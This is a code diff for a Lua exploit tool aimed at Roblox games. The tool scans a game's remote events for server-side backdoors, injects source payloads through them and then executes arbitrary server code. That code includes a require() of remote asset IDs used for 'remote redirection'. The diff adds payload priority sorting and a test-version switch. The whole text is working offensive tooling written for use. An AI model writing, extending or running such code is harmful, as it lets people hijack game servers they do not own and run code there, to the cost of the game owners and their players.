@@ -8,9 +8,10 @@ local starterGui = game:GetService("StarterGui")
 -- variables
 local config
 local execGuiAPI
-local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv(0)h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),b(...)})end;f,g=pcall(setfenv(main,h))end;local i=Instance.new("BoolValue")i.Name,i.Value,i.Parent="%s",f,game:GetService("InsertService")i:SetAttribute("stderr",not f and g or nil)i:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,i.Destroy,i)]]
+local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv(0)local i,j=print,warn;h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),b(...)})end;f,g=pcall(setfenv(main,h))h.print,h.warn=i,j end;local k=Instance.new("BoolValue")k.Name,k.Value,k.Parent="%s",f,game:GetService("InsertService")k:SetAttribute("stderr",not f and g or nil)k:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,k.Destroy,k)]]
 local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s");c(5,b,a,d,nil)]]
 local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
+local payloadList = table.create(0)
 local remoteInfo = {
 	["foundBackdoor"] = false,
 	["instance"] = nil,
@@ -18,6 +19,7 @@ local remoteInfo = {
 	["argSrcIndex"] = 1,
 	["srcFunc"] = nil,
 	["redirection"] = {
+		["__testver"] = false, -- using the test version might not work, use with caution
 		["initialized"] = false,
 		["encryptionSeed"] = Random.new(workspace:GetServerTimeNow()):NextInteger(0, 0xffffffff)
 	}
@@ -53,7 +55,7 @@ local stringifiedTypes = {
 		return string.format("Color3.new(%s)", tostring(value))
 	end,
 	string = function(value)
-		return string.format("\"%s\"", value)
+		return `"{value}"`
 	end,
 	number = function(value)
 		return string.format("%2.f", value)
@@ -361,7 +363,7 @@ local function initRemoteRedirection()
 	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteInfo.redirection.initialized)) then return false end
 	local nonce = generateRandString(32, true)
 
-	execScript(`require(11906423264)("{nonce}", "{remoteInfo.redirection.encryptionSeed}", %userid%)`, true) -- if you wanna try out new features, put 11906414795 as the requireId
+	execScript(`require({if remoteInfo.redirection.__testver then 11906414795 else 11906423264})("{nonce}", "{remoteInfo.redirection.encryptionSeed}", %userid%)`, true) -- if you wanna try out new features, set 'remoteInfo.redirection.__testver' to true
 	-- we need to improvise until :WaitForAttribute is added
 	waitUntil(5, function() return insertService:GetAttribute(nonce) end)
 	local redirectedRemotePath = insertService:GetAttribute(nonce)
@@ -402,7 +404,6 @@ end
 
 local function onAttached(remoteInfoParams)
 	if (remoteInfo.foundBackdoor and remoteInfo.instance) then return end
-	getgenv().__BEXELUAATTACHED = true
 	initializeRemoteInfo(remoteInfoParams)
 	sendNotification("Attached!")
 	warn(string.format(msgOutputs.attached, getFullNameOf(remoteInfoParams.instance), remoteInfoParams.instance.ClassName))
@@ -433,7 +434,7 @@ local scanBackdoors do
 			end)
 		end
 
-		for payloadName, payloadInfo in config.backdoorPayloads do runService.Heartbeat:Wait()
+		for payloadIndex, payloadInfo in payloadList do runService.Heartbeat:Wait()
 			local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
 			if (not remotePassed or not payloadInfo.Args) then continue end
 
@@ -441,7 +442,7 @@ local scanBackdoors do
 			local argSrcIdx = table.find(currentPayload, "source")
 			if not argSrcIdx then continue end
 
-			currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, `{remoteObjId}|{payloadName}`)
+			currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, `{remoteObjId}|{payloadInfo.Name}`)
 			pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
 		end
 	end
@@ -502,46 +503,54 @@ do -- config initialization
 	successCount += (if typeof(loadedConfig.backdoorPayloads) == "table" then 1 else 0)
 	successCount += (if typeof(loadedConfig.cachedPlaces) == "table" then 1 else 0)
 
-	if (loadedConfig.configVer < 7 or successCount < 5) then warn(msgOutputs.outdatedConfig) end
+	if (loadedConfig.configVer < 8 or successCount < 5) then warn(msgOutputs.outdatedConfig) end
 	config = loadedConfig
+
+	for payloadName, payloadInfo in config.backdoorPayloads do
+		payloadInfo.Name = payloadName
+		table.insert(payloadList, payloadInfo)
+	end
+
+	table.sort(payloadList, function(tbl1, tbl2)
+		local tbl1Priority, tbl2Priority =
+			math.clamp((tbl1.Priority or 1024), 1, 1024),
+			math.clamp((tbl2.Priority or 1024), 1, 1024)
+		return tbl1Priority < tbl2Priority
+	end)
 end
 do -- backdoor finding
-	if not getgenv().__BEXELUAATTACHED then
-		local placeCacheData = config.cachedPlaces[game.PlaceId]
+	local placeCacheData = config.cachedPlaces[game.PlaceId]
 
-		if placeCacheData then
-			local successCount = 0
-			local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Remote) else placeCacheData.Remote)
-			local argSrcIndex = (if typeof(placeCacheData.Args) == "table" then table.find(placeCacheData.Args, "source") else nil)
+	if placeCacheData then
+		local successCount = 0
+		local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Remote) else placeCacheData.Remote)
+		local argSrcIndex = (if typeof(placeCacheData.Args) == "table" then table.find(placeCacheData.Args, "source") else nil)
 
-			successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
-			successCount += (if (successCount == 1 and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
-			successCount += (if argSrcIndex then 1 else 0)
+		successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
+		successCount += (if (successCount == 1 and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
+		successCount += (if argSrcIndex then 1 else 0)
 
-			if successCount >= 3 then
-				sendNotification(string.format(msgOutputs.cacheLoaded, game.PlaceId))
-				onAttached({
-					["instance"] = remoteObj,
-					["srcFunc"] = placeCacheData.SourceFunc,
-					["args"] = placeCacheData.Args,
-					["argSrcIndex"] = argSrcIndex
-				})
-			else
-				warn(string.format(msgOutputs.cacheFailed, game.PlaceId))
-			end
+		if successCount >= 3 then
+			sendNotification(string.format(msgOutputs.cacheLoaded, game.PlaceId))
+			onAttached({
+				["instance"] = remoteObj,
+				["srcFunc"] = placeCacheData.SourceFunc,
+				["args"] = placeCacheData.Args,
+				["argSrcIndex"] = argSrcIndex
+			})
 		else
-			local startTime = os.clock()
-
-			sendNotification("Press F9 to see the remotes being scanned.")
-			scanBackdoors()
-			warn(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
-		end
-
-		if not remoteInfo.foundBackdoor then -- if no backdoor found
-			warn(msgOutputs.noBackdoorRemote)
-			sendNotification(msgOutputs.noBackdoorRemote)
+			warn(string.format(msgOutputs.cacheFailed, game.PlaceId))
 		end
 	else
-		sendNotification("Already attached!")
+		local startTime = os.clock()
+
+		sendNotification("Press F9 to see the remotes being scanned.")
+		scanBackdoors()
+		warn(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
+	end
+
+	if not remoteInfo.foundBackdoor then -- if no backdoor found
+		warn(msgOutputs.noBackdoorRemote)
+		sendNotification(msgOutputs.noBackdoorRemote)
 	end
 end
